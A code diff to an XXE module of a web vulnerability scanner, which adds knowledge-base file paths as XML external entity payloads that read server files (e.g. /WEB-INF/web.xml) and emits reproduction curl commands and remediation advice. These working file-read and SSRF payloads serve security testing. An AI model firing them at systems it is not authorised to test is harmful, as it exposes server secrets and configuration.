@@ -1,15 +1,16 @@
 package gg.effront.anarcry.scanner.web.xxe;
 
 import gg.effront.anarcry.model.Finding;
+import gg.effront.anarcry.model.KnowledgeBase;
 import gg.effront.anarcry.model.Severity;
 import gg.effront.anarcry.scanner.ScanContext;
 import gg.effront.anarcry.scanner.Scanner;
 import gg.effront.anarcry.scanner.oast.OastCorrelator;
 import gg.effront.anarcry.scanner.oast.OastPayload;
-import gg.effront.anarcry.scanner.util.Http;
 import gg.effront.anarcry.scanner.util.CircuitBreakerException;
-import gg.effront.anarcry.scanner.util.TlsUtil;
+import gg.effront.anarcry.scanner.util.Http;
 import gg.effront.anarcry.scanner.util.HttpClientFactory;
+import gg.effront.anarcry.scanner.util.TlsUtil;
 import gg.effront.anarcry.scanner.util.WafEvasion;
 
 import java.net.URI;
@@ -18,6 +19,7 @@ import java.net.http.HttpRequest;
 import java.net.http.HttpResponse;
 import java.time.Duration;
 import java.util.ArrayList;
+import java.util.LinkedHashSet;
 import java.util.List;
 import java.util.function.Consumer;
 import java.util.regex.Pattern;
@@ -64,6 +66,49 @@ public class XxeModule implements Scanner {
     private static final String VECTOR_SSRF = "AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N";
     private static final double SCORE_SSRF = CvssCalculator.calculate(VECTOR_SSRF);
 
+    // Detection for WEB-INF and configuration file content (from KB file paths)
+    private static final Pattern CONFIG_CONTENT = Pattern
+            .compile("(?i)<web-app|<servlet|<filter-mapping|<struts-config|<faces-config|soapConfig");
+
+    // Merge hardcoded file-read payload with KB-generated payloads for WEB-INF
+    // paths.
+    // KB provides filesystem paths (e.g., /WEB-INF/web.xml) that become file://
+    // targets.
+    private List<String> mergeKbFileReadPayloads() {
+        LinkedHashSet<String> merged = new LinkedHashSet<>();
+        merged.add(XXE_FILE_READ);
+        for (String kbp : KnowledgeBase.getInstance().filteredPayloads(id())) {
+            String p = kbp.strip();
+            if (!p.startsWith("/")) {
+                continue;
+            }
+            // Strip inline descriptions (e.g., "/WEB-INF/web.xml -- descritor")
+            int descIdx = p.indexOf(" -- ");
+            if (descIdx > 0) {
+                p = p.substring(0, descIdx).strip();
+            }
+            // Skip directory paths (ending with /)
+            if (p.endsWith("/")) {
+                continue;
+            }
+            String payload = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
+                    + "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file://" + p + "\">]>\n"
+                    + "<root><data>&xxe;</data></root>";
+            merged.add(payload);
+        }
+        return List.copyOf(merged);
+    }
+
+    private static String extractFileTarget(String xmlPayload) {
+        int start = xmlPayload.indexOf("SYSTEM \"");
+        if (start < 0) {
+            return "unknown";
+        }
+        start += 8;
+        int end = xmlPayload.indexOf("\"", start);
+        return end > start ? xmlPayload.substring(start, end) : "unknown";
+    }
+
     @Override
     public List<Finding> scan(ScanContext ctx, Consumer<String> log) throws Exception {
         List<Finding> findings = new ArrayList<>();
@@ -73,6 +118,11 @@ public class XxeModule implements Scanner {
         int defPort = ctx.isHttps() ? 443 : 80;
         String base = scheme + "://" + ctx.host() + (ctx.port() != defPort ? ":" + ctx.port() : "");
 
+        List<String> fileReadPayloads = mergeKbFileReadPayloads();
+        int kbCount = fileReadPayloads.size() - 1;
+        if (kbCount > 0) {
+            log.accept("[~] " + id() + ": " + kbCount + " payloads adicionais do Knowledge Base");
+        }
         log.accept("[~] XXE: procurando endpoints XML em " + base);
 
         for (String path : XML_ENDPOINTS) {
@@ -80,22 +130,31 @@ public class XxeModule implements Scanner {
             if (probeXmlAccepted(ctx, hc, url)) {
                 log.accept("[~] XXE: endpoint aceita XML -- " + path);
 
-                // Probe 1: file read -- skip HTML (server's own page echoed back)
-                String fr = sendXml(ctx, hc, url, XXE_FILE_READ);
-                if (fr != null && !isHtml(fr) && FILE_CONTENT_PATTERN.matcher(fr).find()) {
-                    log.accept("[!!] XXE: file-read confirmado em " + path);
-                    findings.add(Finding.of("XXE", path, "XXE -- leitura de arquivo do servidor (file:///etc/hostname)",
-                            Severity.HIGH,
-                            "Endpoint: " + url + " | Resposta contém conteúdo de /etc/hostname: "
-                                    + fr.substring(0, Math.min(200, fr.length())),
-                            "O parser XML expande entidades externas -- atacante pode ler arquivos "
-                                    + "arbitrários do servidor (senhas, chaves, código-fonte)",
-                            "curl -s -X POST '" + url + "' \\\n" + "  -H 'Content-Type: application/xml' \\\n"
-                                    + "  -d '" + XXE_FILE_READ.replace("'", "\\'") + "'",
-                            "Desabilitar DTD e entidades externas no parser XML: "
-                                    + "XMLInputFactory.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES,"
-                                    + "false); " + "use uma allowlist de schemas; migre para JSON onde possível",
-                            CWE_ID, CWE_TITLE, VECTOR_FILE_READ, SCORE_FILE_READ));
+                // Probe 1: file read -- iterate hardcoded + KB file-read payloads
+                boolean fileReadFound = false;
+                for (String frPayload : fileReadPayloads) {
+                    String fr = sendXml(ctx, hc, url, frPayload);
+                    if (fr != null && !isHtml(fr)
+                            && (FILE_CONTENT_PATTERN.matcher(fr).find() || CONFIG_CONTENT.matcher(fr).find())) {
+                        String targetFile = extractFileTarget(frPayload);
+                        log.accept("[!!] XXE: file-read confirmado em " + path + " (" + targetFile + ")");
+                        findings.add(Finding.of("XXE", path,
+                                "XXE -- leitura de arquivo do servidor (" + targetFile + ")", Severity.HIGH,
+                                "Endpoint: " + url + " | Resposta contem conteudo de " + targetFile + ": "
+                                        + fr.substring(0, Math.min(200, fr.length())),
+                                "O parser XML expande entidades externas -- atacante pode ler arquivos "
+                                        + "arbitrarios do servidor (senhas, chaves, codigo-fonte)",
+                                "curl -s -X POST '" + url + "' \\\n" + "  -H 'Content-Type: application/xml' \\\n"
+                                        + "  -d '" + frPayload.replace("'", "\\'") + "'",
+                                "Desabilitar DTD e entidades externas no parser XML: " + "XMLInputFactory.setProperty("
+                                        + "XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES," + "false); "
+                                        + "use uma allowlist de schemas; migre para JSON onde possivel",
+                                CWE_ID, CWE_TITLE, VECTOR_FILE_READ, SCORE_FILE_READ));
+                        fileReadFound = true;
+                        break;
+                    }
+                }
+                if (fileReadFound) {
                     break;
                 }
 
@@ -104,14 +163,14 @@ public class XxeModule implements Scanner {
                 if (ssrf != null && !isHtml(ssrf) && SSRF_PATTERN.matcher(ssrf).find()) {
                     log.accept("[!!] XXE: SSRF via XXE confirmado em " + path);
                     findings.add(Finding.of("XXE", path,
-                            "XXE SSRF -- servidor faz requisição HTTP interna via entidade externa", Severity.HIGH,
-                            "Endpoint: " + url + " | Resposta reflete conteúdo de http://127.0.0.1/: "
+                            "XXE SSRF -- servidor faz requisicao HTTP interna via entidade externa", Severity.HIGH,
+                            "Endpoint: " + url + " | Resposta reflete conteudo de http://127.0.0.1/: "
                                     + ssrf.substring(0, Math.min(200, ssrf.length())),
-                            "O parser XML faz requisições HTTP para destinos internos -- atacante "
-                                    + "pode alcançar serviços não expostos, cloud metadata e APIs internas",
+                            "O parser XML faz requisicoes HTTP para destinos internos -- atacante "
+                                    + "pode alcancar servicos nao expostos, cloud metadata e APIs internas",
                             "curl -s -X POST '" + url + "' \\\n" + "  -H 'Content-Type: application/xml' \\\n"
                                     + "  -d '" + XXE_SSRF.replace("'", "\\'") + "'",
-                            "Desabilitar DTD externo no parser XML; bloquear conexões de saída do "
+                            "Desabilitar DTD externo no parser XML; bloquear conexoes de saida do "
                                     + "processo do servidor para redes internas (iptables egress rules)",
                             CWE_ID, CWE_TITLE, VECTOR_SSRF, SCORE_SSRF));
                     break;
